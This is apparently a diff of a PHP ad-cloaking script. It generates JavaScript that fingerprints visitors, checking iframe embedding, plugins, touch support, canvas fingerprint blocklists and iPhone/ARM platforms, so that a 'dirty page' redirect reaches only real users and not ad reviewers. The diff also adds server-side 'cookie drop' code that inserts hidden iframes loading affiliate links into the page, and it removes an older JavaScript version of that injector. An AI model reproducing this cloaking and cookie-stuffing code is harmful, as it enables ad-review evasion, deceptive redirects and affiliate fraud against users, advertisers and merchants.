@@ -708,6 +708,8 @@
 	}
 	else
 	{
+		//Dirty page...
+		
 		if ($loggingEnabled)
 		{
 			allowedTrafficLog($campaignID, $ip, $isp["isp"]);
@@ -750,6 +752,7 @@
 			adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
 		}
 
+		// Get the redirect code (JS)
 		if ($redirectMethod === "trycatchredirect")
 		{
 			$redirectCode = "try
@@ -774,108 +777,98 @@
 
 		$scriptCode = "<script type=\"text/javascript\">
 
-						var testResults = [];
+			var testResults = [];
 
-						function isTrue(value)
+			function isTrue(value)
+			{
+				return value === true;
+			}
+
+			if (typeof jslog !== 'function')
+			{
+				jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
+			}" .
+
+			($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
+
+			($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
+			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
+			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
+			($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
+
+		   "
+			function inBlockedCanvasList()
+			{
+				var blockedList = [null, $blockedCanvasFingerprints];
+				var canvasFingerPrint = getCanvasFingerprint();
+
+				var result = blockedList.indexOf(canvasFingerPrint) !== -1;
+
+				if (result)
+				{
+					jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
+				}
+				else
+				{
+					jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
+				}
+
+				return result;
+			}
+
+			$referrerDomainScript
+
+			function go()
+			{\n";
+
+			// Add cookie drop code
+			if (false && $iFrameCookiesEnabled) {
+				foreach($affiliateLinkUrl as $url) {
+					if (strlen($url) > 0) {
+						$scriptCode .= "document.write('<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');";
+					}
+				}
+			}
+			
+			$scriptCode .=
+				($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
+				($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
+				($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
+				($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
+				($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
+			   "jslog(testResults);
+
+				if (testResults.every(isTrue))
+				{
+					if (/(iphone|linux armv)/i.test(window.navigator.platform))
+					{
+						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
+
+						setTimeout(function()
 						{
-							return value === true;
-						}
+							var topDomain = getReferrerDomain();
 
-						if (typeof jslog !== 'function')
-						{
-							jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
-						}" .
-
-						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
-
-					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
-			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
-			   			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
-						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
-
-					   "
-					   	function inBlockedCanvasList()
-						{
-							var blockedList = [null, $blockedCanvasFingerprints];
-							var canvasFingerPrint = getCanvasFingerprint();
-
-							var result = blockedList.indexOf(canvasFingerPrint) !== -1;
-
-							if (result)
-							{
-								jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
-							}
-							else
-							{
-								jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
-							}
-
-							return result;
-						}
-
-						$referrerDomainScript
-
-						function go()
-						{\n" .
-							($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
-						   	($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
-				   			($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
-				   			($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
-							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
-						   "jslog(testResults);
-
-						   	if (testResults.every(isTrue))
-						   	{
-							   	if (/(iphone|linux armv)/i.test(window.navigator.platform))
-							    {
-									jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
-
-								    setTimeout(function()
-									{
-										var topDomain = getReferrerDomain();
-
-										$redirectCode
-									}, $redirectTimeout);
-								}
-								else
-								{
-									jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
-								}
-							}
-					   	}";
-
-
-					if ($iFrameCookiesEnabled) {
-						$scriptCode .=
-"(function() {
-    var packageName = 'dreamsky';
-    if (!window[packageName]) {
-        window[packageName] = {};
-    }
-    var tool = {
-        ismobile: function() {
-            if (!(('ontouchstart' in window) || (navigator.MaxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0))) {
-                return false;
-            return true;
-        },
-        writeOffer: function(offerUrl) {
-            document.write('<iframe src=\"' + offerUrl + '\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');
-        },
-    }
-    window[packageName]['tool'] = tool;
-})();
-
-if (dreamsky.tool.ismobile()) {";
-
-						foreach($affiliateLinkUrl as $url) {
-							if (strlen($url) > 0) {
-								$scriptCode .= "dreamsky.tool.writeOffer('" . $url. "');";
-							}
-						}
-						$scriptCode .= "} ";
-					}					   
-					
-					$scriptCode .= "</script>";
+							$redirectCode
+						}, $redirectTimeout);
+					}
+					else
+					{
+						jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
+					}
+				}
+			}";
+		
+		$scriptCode .= "</script>";
+					   
+		// Add cookie drop code without JS
+		if (true && $iFrameCookiesEnabled) {
+			foreach($affiliateLinkUrl as $url) {
+				if (strlen($url) > 0) {
+					$iframeCode = "<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>"; 
+					$resultHtml = str_replace("</body>", $iframeCode."</body>",$resultHtml);
+				}
+			}
+		}
 					   
 		if ($outputMethod === "JS")
 		{
